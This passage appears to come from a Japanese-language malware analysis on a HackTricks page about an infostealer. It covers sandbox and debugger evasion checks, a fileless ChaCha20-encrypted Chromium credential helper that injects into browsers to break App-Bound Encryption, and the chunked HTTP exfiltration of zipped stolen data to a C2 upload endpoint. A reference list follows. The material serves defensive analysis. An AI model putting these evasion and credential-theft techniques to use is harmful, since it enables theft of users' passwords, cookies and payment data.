- Variant A はプロセス一覧を走査し、各名前をカスタムのローリングチェックサムでハッシュ化してデバッガ/サンドボックス用の組み込みブロックリストと照合します。さらに同じチェックサムをコンピュータ名にも適用し、`C:\analysis` のような作業ディレクトリを確認します。
- Variant B はシステムプロパティ（プロセス数の下限、最近の稼働時間など）を検査し、`OpenServiceA("VBoxGuest")` を呼び出して VirtualBox の追加コンポーネントを検出し、スリープ前後のタイミングチェックでシングルステップを検出します。ヒットがあればモジュール起動前に中止します。

### ファイルレスヘルパー + double ChaCha20 リフレクティブロード

- プライマリの DLL/EXE は Chromium credential helper を埋め込み、ディスクにドロップするかメモリ上に手動でマッピングします。fileless モードではインポート/リロケーションを自身で解決するため、ヘルパーのアーティファクトは書き込まれません。
- そのヘルパーは二重に ChaCha20（32バイト鍵×2 + 12バイト nonce）で暗号化されたセカンドステージ DLL を格納します。両方のパスを実行した後、blob をリフレクティブにロード（`LoadLibrary` は使用しない）し、[ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) に由来するエクスポート `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` を呼び出します。
- ChromElevator のルーチンは direct-syscall リフレクティブ process hollowing を使用してライブの Chromium ブラウザに注入し、AppBound Encryption 鍵を継承して、ABE 強化下でも SQLite データベースからパスワード/クッキー/クレジットカード情報を直接復号します。

### モジュラーなインメモリ収集 & chunked HTTP exfil

- `create_memory_based_log` はグローバルな `memory_generators` 関数ポインタテーブルを反復し、有効な各モジュール（Telegram, Discord, Steam, screenshots, documents, browser extensions など）につき1スレッドを生成します。各スレッドは結果を共有バッファに書き込み、約45秒の join ウィンドウ後にファイル数を報告します。
- 処理が終わると、すべてがスタティックリンクされた `miniz` ライブラリで `%TEMP%\\Log.zip` として圧縮されます。`ThreadPayload1` はその後15秒スリープし、アーカイブを10 MBチャンクで HTTP POST により `http://<C2>:6767/upload` にストリーム送信します。ブラウザの `multipart/form-data` バウンダリ（`----WebKitFormBoundary***`）を偽装します。各チャンクには `User-Agent: upload`、`auth: <build_id>`、任意で `w: <campaign_tag>` を付与し、最後のチャンクに `complete: true` を追加して C2 が再構成完了を認識できるようにします。

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)

{{#include ../banners/hacktricks-training.md}}
